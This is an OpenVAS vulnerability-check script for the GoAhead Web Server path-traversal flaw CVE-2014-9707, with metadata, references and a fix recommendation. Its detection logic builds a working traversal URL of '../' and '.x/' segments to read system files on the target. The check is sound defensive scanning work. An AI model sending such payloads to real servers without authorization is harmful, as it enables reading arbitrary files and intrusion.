###############################################################################
# OpenVAS Vulnerability Test
#
# GoAhead Webserver Multiple Vulnerabilities - Apr15
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805521");
  script_version("2022-12-05T10:11:03+0000");
  script_cve_id("CVE-2014-9707");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2015-04-06 09:25:29 +0530 (Mon, 06 Apr 2015)");
  script_name("GoAhead Webserver Multiple Vulnerabilities - Apr15");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_goahead_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("embedthis/goahead/detected");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131156");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Mar/157");
  script_xref(name:"URL", value:"https://github.com/embedthis/goahead/issues/106");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/535027/100/0/threaded");

  script_tag(name:"summary", value:"GoAhead Webserver is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read local file or not.");

  script_tag(name:"insight", value:"The error exists due to logic flaw in the
  'websNormalizeUriPath' function in http.c script.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system, conduct
  denial-of-service attack and potentially execute arbitrary code.");

  script_tag(name:"affected", value:"GoAhead Web Server versions 3.x.x before
  3.4.2.");

  script_tag(name:"solution", value:"Upgrade to GoAhead Web Server 3.4.2 or later.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:embedthis:goahead";

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files();
foreach file (keys(files)){

  url = "/" + crap(data:"../",length:3*5) + crap(data:".x/", length:3*6) + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file)){
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
